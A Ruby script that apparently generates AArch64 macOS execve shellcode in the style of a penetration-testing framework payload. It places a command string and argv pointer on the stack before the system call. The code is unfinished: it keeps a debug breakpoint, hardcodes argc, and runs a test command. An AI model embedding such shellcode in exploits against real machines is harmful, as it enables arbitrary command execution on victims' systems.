require 'shellwords'

class Payload
  def align_to_16_bytes(value, required_byte_alignment: 16)
    return value if value % required_byte_alignment == 0

    value + (required_byte_alignment - (value % required_byte_alignment))
  end

  def hex(val)
    val.to_s(16).rjust(2, '0')
  end

  def register_byte_size
    8
  end

  def required_bytes_for_argv_pointers
    null_pointer_count = 1
    register_byte_size * (argc + null_pointer_count)
  end

  def argc
    # program name
    1
  end

  # @param [Array<String>] cmd_parts Such as ['/bin/bash', '-c' 'whoami']
  def write_program_name_and_argv_pointers(cmd_parts)
    asm = []

    # 16 byte align each cmd_part value
    argv_byte_size = cmd_parts.sum { |cmd_part| align_to_16_bytes("#{cmd_part}\x00".length) }
    required_stack_size = argv_byte_size + required_bytes_for_argv_pointers
    if required_stack_size >= 256
      # Not supported as the syntax 'str x1, [sp, #-#{sp_offset}]' would fail, as the relative index must be an integer in range [-256, 255].
      raise NotImplementedError, "Byte length #{required_stack_size} too large and cannot be encoded"
    end

    stack_pointer_offset = required_stack_size
    argv_stack_offsets = []
    cmd_parts.each do |cmd_part|
      argv_stack_offsets << stack_pointer_offset
      cmd_part_bytes = cmd_part.bytes
      # Padding
      cmd_part_bytes += [0] * (align_to_16_bytes(cmd_part_bytes.length) - cmd_part_bytes.length)
      cmd_part_bytes.each_slice(register_byte_size) do |slice|
        asm << "# Starting bytes: #{slice.inspect} (#{slice.map { |value| value >= 32 && value <= 126 ? value.chr : '.' }.join})"

        asm << "mov x5, #0x#{hex(slice[1])}#{hex(slice[0])}"
        asm << "movk x5, #0x#{hex(slice[3])}#{hex(slice[2])}, lsl #16"
        asm << "movk x5, #0x#{hex(slice[5])}#{hex(slice[4])}, lsl #32"
        asm << "movk x5, #0x#{hex(slice[7])}#{hex(slice[6])}, lsl #48"

        asm << "str x5, [sp, #-#{stack_pointer_offset}]"
        stack_pointer_offset -= register_byte_size
      end
    end

    argv_pointer_offset = stack_pointer_offset
    # Argv pointers
    asm << "// argv pointers"
    asm << "mov x5, sp"
    asm << "sub x5, x5, ##{argv_stack_offsets[0]} // program name base pointer"
    asm << "stp x5, xzr, [sp, #-#{required_bytes_for_argv_pointers}] // Store program name pointer followed by xzr, i.e. char *argv[] = { #{cmd_parts.map(&:inspect).join(", ")}, NULL };"

    require 'pry-byebug'; binding.pry
    { asm: asm, argv_byte_size: argv_byte_size, argc_offset: argv_pointer_offset }
  end

  def datastore
    # datastore = { 'CMD' => '/bin/bash' }
    datastore = { 'CMD' => '/Users/jenkins/testing/test a b c d' }
    datastore
  end

  def generate
    asm = []
    cmd_str = datastore['CMD'] || ''
    cmd_parts = Shellwords.shellsplit(cmd_str)

    # Uses
    program = datastore['CMD']
    bytes = program.bytes

    # Write the bytes to the stack below the current sp location
    # bytes = "#{program.b}\x00".bytes
    asm << '// write execve arguments on the stack, i.e. program name / argv'
    data_result = write_program_name_and_argv_pointers(cmd_parts)
    data_asm = data_result[:asm]
    data_argv_byte_size = data_result[:argv_byte_size]
    asm += data_asm

    asm << '// syscall'
    asm << 'ldr x16, =0x200003b  // Load sys number for SYS_EXECVE'
    asm << 'mov x0, sp           // Arg0: char* path - Pointer to the current stack position'
    asm << "sub x0, x0, ##{data_argv_byte_size}  // subtract to the base of the program name"
    asm << "mov x1, sp          // Arg1: char *const argv[] - program name pointer for now"
    asm << "sub x1, x1, ##{required_bytes_for_argv_pointers}"
    asm << "mov x2, xzr         // Arg2: char *const envp[] - NULL for now"
    asm << 'svc #0              // Supervisor call - i.e. the system call'

    # asm << 'ldr x16, =0x2000004  // Load sys number for SYS_WRITE'
    # asm << 'mov x0, 0            // Arg0: stdout file descriptor'
    # asm << 'mov x1, sp           // Arg1: Pointer to the current stack position, will be the base of the written program name string'
    # asm << "sub x1, x1, #{align_to_16_bytes(bytes.length)}        // Arg1: Point to the start of the string"
    # asm << "mov x2, ##{bytes.length}           // Arg2: The size of the message in bytes"
    # asm << 'svc #0               // Supervisor call - i.e. the system call'
  end
end

puts Payload.new.generate.join("\n")
